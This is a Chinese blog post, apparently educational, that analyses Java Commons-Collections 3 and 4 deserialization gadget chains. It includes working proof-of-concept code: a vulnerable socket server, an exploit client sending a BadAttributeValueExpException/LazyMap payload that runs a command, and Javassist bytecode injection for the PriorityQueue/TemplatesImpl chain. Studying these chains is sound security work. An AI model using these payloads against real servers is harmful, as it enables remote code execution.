@@ -1,0 +1,284 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>漫谈Commons-Collections反序列化 - 像清水一般清澈透明</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="清水Samny,"> 
+    <meta name="description" content="﻿# 前言
+&amp;emsp;&amp;emsp; 如果你没有反序列化的基础，建议你看笔者博客文章先将基础学习一下。如果你没有学习分析过ysoserial--Gadget--URLDNS，建议你看笔者之前发过的文,"> 
+    <meta name="author" content="Samny"> 
+    <link rel="alternative" href="atom.xml" title="像清水一般清澈透明" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">像清水一般清澈透明</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">漫谈Commons-Collections反序列化</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">漫谈Commons-Collections反序列化</h1>
+        <div class="stuff">
+            <span>五月 26, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Java-Commons-Collections/" rel="tag">Java Commons-Collections</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>﻿# 前言</p>
+<p>&emsp;&emsp; 如果你没有反序列化的基础，建议你看笔者博客文章先将基础学习一下。如果你没有学习分析过<code>ysoserial--Gadget--URLDNS</code>，建议你看笔者之前发过的文章学习一下。如果你是大佬，前面当笔者没说。<br>&emsp;&emsp; Java的第一个反序列化漏洞就是从<code>commons-collections</code>组件中发现的，从此打开了Java安全的新蓝图。<br>官方对<code>commons-collections</code>组件的说明：<code>The Java Collections Framework was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</code><br>翻译一下大概意思就是：<code>Java commons-collections 框架是JDK 1.2之后中的一个重要补充。增加了许多强大的数据结构，加快了Java应用程序的开发。已经成为Java中公认的集合处理标准。</code><br>&emsp;&emsp; 目前<code>commons-collections</code>的反序列化漏洞主要以3和4(版本)为主流，3和4的利用方式也不同，Gadget链也不相同。</p>
+<p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p>
+<hr>
+<h1 id="Commons-Collections3"><a href="#Commons-Collections3" class="headerlink" title="Commons-Collections3"></a>Commons-Collections3</h1><p>&emsp;&emsp; 先看一下Gadget链，入口是上篇文章提及的。这里的3是指版本号，笔者这里只分析网上流传的某一条利用链。<code>BadAttributeValueExpException.readObject()</code>类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp; 试想一下先存在一个服务器，它正好存在使用<code>commons-collections</code>组件，没有做任何的修复，存在漏洞。此时你是不是就能利用此漏洞呢？</p>
+<hr>
+<h2 id="模拟场景DEMO"><a href="#模拟场景DEMO" class="headerlink" title="模拟场景DEMO"></a><strong>模拟场景DEMO</strong></h2><h3 id="创建模拟服务器应用"><a href="#创建模拟服务器应用" class="headerlink" title="创建模拟服务器应用"></a>创建模拟服务器应用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 模拟服务器端，接受反序列化数据</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">            System.out.println(<span class="string">"服务器监听地址： "</span> + serverSocket.getLocalSocketAddress());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="comment">// 接受反序列化数据</span></span><br><span class="line"></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"与地址： "</span> + socket.getInetAddress() + <span class="string">"连接！"</span> );</span><br><span class="line">                ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 读取数据</span></span><br><span class="line">                    Object ob = ois.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"读取数据完成！"</span>);</span><br><span class="line">                    System.out.println(ob);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"读取数据失败！"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//目的服务器地址</span></span><br><span class="line">        String tas = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        <span class="comment">// 端口</span></span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">        <span class="comment">// payload</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"66666!"</span>)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建漏洞map Object</span></span><br><span class="line">        Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建异常，在反序列化时触发payload</span></span><br><span class="line">        BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(expException, entry);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送payload</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(tas,port);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">        oos.writeObject(expException);</span><br><span class="line">        oos.flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞效果"><a href="#漏洞效果" class="headerlink" title="漏洞效果"></a>漏洞效果</h3><p>首先得让模拟服务器在运行，然后发送payload即可。<br><img src="https://img-blog.csdnimg.cn/20200517150503233.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517150434644.gif" alt="在这里插入图片描述"></p>
+<hr>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>&emsp;&emsp; 分析必定要先断点，这里笔者将代码修改了，便于分析。这里就不再贴出，需要的可以去<a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/cc5.java" target="_blank" rel="noopener">GitHub</a>上自取，断点直接设置在<code>readObject</code>方法。<br><code>温馨提示</code>：如果你用的是Idea工具，在Debug之前请查看自己Debugger设置，请和我一样设置。为什么要这么做可以参考：<a href="https://samny.blog.csdn.net/article/details/105937958" target="_blank" rel="noopener">Skipped breakpoint because it happened inside debugger evaluation</a> ，否则你可能出现很多bug。<br><img src="https://img-blog.csdnimg.cn/20200517155502933.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517151930246.png" alt="在这里插入图片描述"></p>
+<hr>
+<h4 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h4><ol>
+<li>一直跟进，到<code>BadAttributeValueException.java</code>的<code>readObject</code>方法。</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/20200517163343981.png" alt="在这里插入图片描述"><br>2. toString方法会跳转到<code>TiedMapEntry</code>的toString方法<br><img src="https://img-blog.csdnimg.cn/20200517163803421.png" alt="在这里插入图片描述"><br>3. 跟进getValue()方法<br><img src="https://img-blog.csdnimg.cn/20200517165203612.png" alt="在这里插入图片描述"><br>4. 跟进到get()方法，在get方法中，会判断<code>key</code>是否存在。然后跳转到<code>transform(key)</code>，这里的key是随便填写的，主要是transform方法是被修改过的，里面有恶意payload。<br><img src="https://img-blog.csdnimg.cn/20200517165322855.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200517165354634.png" alt="在这里插入图片描述"><br>5. 这里是用Java的反射机制，建议去了解一下。推荐博文<a href="https://blog.csdn.net/sun1318578251/category_9977685.html" target="_blank" rel="noopener">从安全角度谈Java反射机制</a><br><img src="https://img-blog.csdnimg.cn/20200517173626405.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517164317458.png" alt="在这里插入图片描述"></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLXN0YXRpYy5jbmJsb2dzLmNvbS9maWxlcy9zYW1ueS9zZXJpYWxpemFibGUzLmdpZg" alt="https://blog-static.cnblogs.com/files/samny/serializable3.gif"><br>&emsp;&emsp; 看完整个完整的过程，每一步都对应着文章开头的Gadget chain。创建异常类<code>BadAttributeValueExpException</code>，以便于在反序列化时触发payload。<br><img src="https://img-blog.csdnimg.cn/2020051814514391.png" alt="在这里插入图片描述"></p>
+<hr>
+<h4 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h4><p>&emsp;&emsp; 过程看完了，但是我们还是无法理解为什么可以这么构造，还是得一步步看POC源码。我们一一对着官方文档分析函数方法的具体作用。</p>
+<ol>
+<li>ChainedTransformer将一个个Transformer类数组按照顺序一个个执行，前一个运行结果作为第二个transform。<br><img src="https://img-blog.csdnimg.cn/20200517173011310.png" alt="在这里插入图片描述"></li>
+<li>ConstantTransformer调用transform方法，返回类在实例化时存储的类。<br><img src="https://img-blog.csdnimg.cn/20200517173510549.png" alt="在这里插入图片描述"></li>
+<li>InvokerTransformer调用transform方法的时候，根据类在实例化时提供的参数，通过反射去调用对象的方法。InvokerTransformer第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(java.lang.String methodName,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Class[] paramTypes,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Object[] args)</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200517175953505.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 这是一段反射执行命令的代码，这段执行的效果完全等效于transformers[]数组，下面两张图片可以完美的诠释。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">//实例化对象</span></span><br><span class="line">          Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">           <span class="comment">// 反射调用执行命令</span></span><br><span class="line">           cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200517164708950.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200517175632226.png" alt="在这里插入图片描述"></p>
+<hr>
+<p>&emsp;&emsp; 创建一个HashMap，使用LazyMap.decorate()方法传入HashMap和Transformer数组。其中数组是我们构造的payload，最后使用TiedMapEntry传入一个key。其实也可以这样子<code>lazymap.get(&quot;Summer&quot;)</code>也可以传入key，这样子会在序列化过程就将key写入，而在反序列化的时候不会调用<code>LazyMap.get()</code>方法，判断key是否存在。不存在则会调用<code>this.factory.transform(key);</code>方法，进而触发反序列化漏洞。所以很显然这种方法不可取，只能通过修改底层的方式，加入key值，以便于在反序列化的时候触发漏洞，并同时确保在序列化的过程不会触发漏洞。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">      Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">      TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200518095025914.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 到目前为止，并没有触发反序列化漏洞的入口。而<code>BadAttributeValueExpException</code>这个类是javax.management报下的一个类，是jdk自带的，无需依赖第三方。它继承了Serializable接口满足反序列化漏洞的条件，它只有一个值权限是private不可修改，但利用反射机制修改其值来到达触发反序列化漏洞的目的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">           field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           field.set(expException, entry);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; 反序列化利用点是使用<code>LazyMap</code>在获取key值的时候，使其key不存在，然后再获取key的时候触发漏洞。但需要有一个入口，这里的反序列化触发的入口是JDK自带的<code>BadAttributeValueExpException</code>类。有几个点不得不服大佬们的厉害之处，第一点是找到反序列化的入口<code>BadAttributeValueExpException</code>，这个类得满足反序列化的基本条件，还得是JDK自带或者是组件自带的。第二点是使用<code>LazyMap</code>的key为空来触发反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518105354743.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="Commons-Collections4"><a href="#Commons-Collections4" class="headerlink" title="Commons-Collections4"></a>Commons-Collections4</h1><p> 先看一下Gadget链，入口是JDK自带的<code>PriorityQueue.readObject()</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br><span class="line">                                TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp; 断点撸码，断点的位置对于新手可能有点不知道该从何下手，其实掌握一点，看入口，反序列化的入口。<code>Commons-Collections4</code>这里的入口时<code>PriorityQueue.readObject()</code>方法，这时你可以双击<code>Shift</code>，找到该类在readObject下断点。<br><img src="https://img-blog.csdnimg.cn/20200518164944907.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 去掉注释，也就省这么几行代码。自己结合官方文档分析一下就知道该断在哪里，如果你在知道具体步骤，你可以将每一行都设置个断点进行分析。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        s.readInt();</span><br><span class="line">        queue = <span class="keyword">new</span> Object[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞触发流程-1"><a href="#漏洞触发流程-1" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h3><ol>
+<li>从ObjectInputStream.readObject()-&gt;PriorityQueue.readObject()-&gt;heapify()方法<br><img src="https://img-blog.csdnimg.cn/2020051816535565.png" alt="在这里插入图片描述"></li>
+<li>接着会执行heapify()-&gt;sifrDown()<br><img src="https://img-blog.csdnimg.cn/20200518165629497.png" alt="在这里插入图片描述"></li>
+<li>sifrDown()-&gt;comparator不为空进入siftDownUsingComparator()方法<br><img src="https://img-blog.csdnimg.cn/2020051816581125.png" alt="在这里插入图片描述"></li>
+<li>if判断是否&lt;=0是触发漏洞<br><img src="https://img-blog.csdnimg.cn/20200518165904692.png" alt="在这里插入图片描述"></li>
+<li>compare方法会执行transformer的transform方法，而transform通过反射机制被修改过，最后会导致反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518170453617.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200519095242678.png" alt="在这里插入图片描述"></li>
+</ol>
+<hr>
+<h3 id="漏洞成因分析-1"><a href="#漏洞成因分析-1" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h3><p><a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java" target="_blank" rel="noopener">完整的实验代码地址https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java</a><br>&emsp;&emsp; Javaassist被广泛用于修改字节码的工具包，而此gadget chain中使用修改字节码的形式触发漏洞。一个 CtClass (编译时类）对象可以处理一个 class 文件，ClassPool 是 CtClass 对象的容器。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取默认系统类搜索路径</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 添加额外的类搜索路径</span></span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Payload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">      <span class="comment">// 获取我们恶意payload的对象</span></span><br><span class="line">      <span class="keyword">final</span> CtClass clazz = pool.get(Payload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp; 修改好字节码后，在通过一系列的反射方法，将构造好的字节加入<code>tamplates</code>中，在反序列化的过程触发漏洞。反射这里就不过多的解释，如果不懂可以看笔者往期的博文。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// 静态初始化时插入执行命令的字节码</span></span><br><span class="line">      String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">      clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"><span class="comment">// 将初始化后的类设置新的名字</span></span><br><span class="line">      clazz.setName(<span class="string">"Summer"</span> + System.nanoTime());</span><br><span class="line">      <span class="comment">// 设置父类为AbstractTranslet</span></span><br><span class="line">      CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">      clazz.setSuperclass(superC);</span><br><span class="line"><span class="comment">// 获取修改后的字节码</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp; 其实将第二个占位只要是Object的类型对象就可以，比例可以是<code>tpl.newInstace()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里queue要占两个位，比较方法是要两个才能比较</span></span><br><span class="line">      <span class="comment">// 两个位的都要是一个类型，这里都是Object</span></span><br><span class="line">      queue.add(templates);</span><br><span class="line">      queue.add(<span class="keyword">new</span> VerifyError(<span class="string">"Summer"</span>));</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;修改字节码之后我们再看看<code>newTransformer()</code>–&gt;<code>TemplatesImpl.getTransletInstance()</code> 方法。<br><img src="https://img-blog.csdnimg.cn/20200520141806664.png" alt="在这里插入图片描述"><br>&emsp;&emsp; <code>getTransletInstance()</code>–&gt;<code>defineTransletClasses()</code>，这里会返回一个定义主类的类对象的引用。<br><img src="https://img-blog.csdnimg.cn/20200520142312443.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 最后在这里的强制类型转化触发漏洞，到达执行命令的效果。<br><img src="https://img-blog.csdnimg.cn/20200520142424728.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200520142558464.gif" alt="在这里插入图片描述"></p>
+<hr>
